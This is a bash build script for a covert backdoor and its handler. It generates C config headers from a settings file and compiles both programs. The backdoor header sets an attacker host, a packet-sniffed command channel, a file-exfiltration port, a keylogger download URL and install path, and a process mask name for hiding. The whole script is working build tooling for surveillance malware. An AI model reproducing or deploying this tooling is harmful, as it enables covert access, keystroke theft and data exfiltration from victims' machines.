#!/bin/bash

# Backdoor config generate
echo "#ifndef CONFIG_H" > config.h
echo "#define CONFIG_H" >> config.h
echo "" >> config.h
echo "#define MAX_DATA_SIZE 65535" >> config.h
echo "#define MAX_BUFFER_SIZE 256" >> config.h
echo '#define ZIP_NAME "enc.zip"' >> config.h
echo "" >> config.h
echo "#define STR_HELPER(x) #x" >> config.h
echo "#define STR(x) STR_HELPER(x)" >> config.h
echo "" >> config.h
echo "#define NIC_NAME `cat setting.json | jq '.backdoor.NIC_NAME'`" >> config.h
echo "#define LHOST `cat setting.json | jq '.handler.IP'`" >> config.h
echo "#define CMD_CHANNEL_PORT `cat setting.json | jq '.setting.CMD_CHANNEL_PORT'`" >> config.h
echo "#define FILE_EXFILT_PORT `cat setting.json | jq '.setting.FILE_EXFILT_PORT'`" >> config.h
echo "#define HEADER_KEY `cat setting.json | jq '.setting.HEADER_KEY'`" >> config.h
echo "#define PASSWORD `cat setting.json | jq '.setting.PASSWORD'`" >> config.h
echo "" >> config.h
echo "const char *watch_list[][2] = {" >> config.h
for k in $(jq -r '.backdoor.watch_list | keys[] as $k | "\t{\"\($k)\",\"\(.[$k])\"},"' setting.json); do
echo $k >> config.h 
done
echo "};" >> config.h
echo "" >> config.h
echo '#define SNIFFER_FILTER "src host " LHOST " and udp dst port " STR(CMD_CHANNEL_PORT)' >> config.h
echo '#define EXFILT_FUNC_NAME "exfilt-file "' >> config.h
echo "" >> config.h
echo "#define KEYLOGGER_URL `cat setting.json | jq '.backdoor.keylogger.url'`" >> config.h
echo "#define KEYLOGGER_INSTALL_DIR `cat setting.json | jq '.backdoor.keylogger.location'`" >> config.h
echo "#define KEYLOGGER_NAME `cat setting.json | jq '.backdoor.keylogger.name'`" >> config.h
echo "#define SAVE_AT `cat setting.json | jq '.backdoor.keylogger.save_at'`" >> config.h
echo "" >> config.h
echo "#define MASK_NAME `cat setting.json | jq '.setting.mask_name'`" >> config.h
echo "" >> config.h
echo "#endif" >> config.h
echo y | cp config.h ./backdoor/src

# Handler config generate
echo "#ifndef CONFIG_H" > config.h
echo "#define CONFIG_H" >> config.h
echo "" >> config.h
echo "#define STR_HELPER(x) #x" >> config.h
echo "#define STR(x) STR_HELPER(x)" >> config.h
echo "" >> config.h
echo "#define NIC_NAME `cat setting.json | jq '.handler.NIC_NAME'`" >> config.h
echo "#define BACKDOOR_IP `cat setting.json | jq '.backdoor.IP'`" >> config.h
echo "#define CMD_CHANNEL_PORT `cat setting.json | jq '.setting.CMD_CHANNEL_PORT'`" >> config.h
echo "#define FILE_EXFILT_PORT `cat setting.json | jq '.setting.FILE_EXFILT_PORT'`" >> config.h
echo "#define EXFILT_FOLDER_PATH `cat setting.json | jq '.handler.exfilt_dir'`" >> config.h
echo "#define HEADER_KEY `cat setting.json | jq '.setting.HEADER_KEY'`" >> config.h
echo "#define PASSWORD `cat setting.json | jq '.setting.PASSWORD'`" >> config.h
echo "" >> config.h
echo '#define SNIFFER_FILTER "src host " BACKDOOR_IP " and dst port " STR(CMD_CHANNEL_PORT)' >> config.h
echo "" >> config.h
echo "#define MASK_NAME `cat setting.json | jq '.setting.mask_name'`" >> config.h
echo "" >> config.h
echo "#endif" >> config.h
echo y | cp config.h ./handler/src

echo y | rm config.h
(cd ./backdoor && make clean && make)
(cd ./handler && make clean && make)
(echo y | cp ./backdoor/backdoor.elf .)
(echo y |cp ./handler/handler.elf .)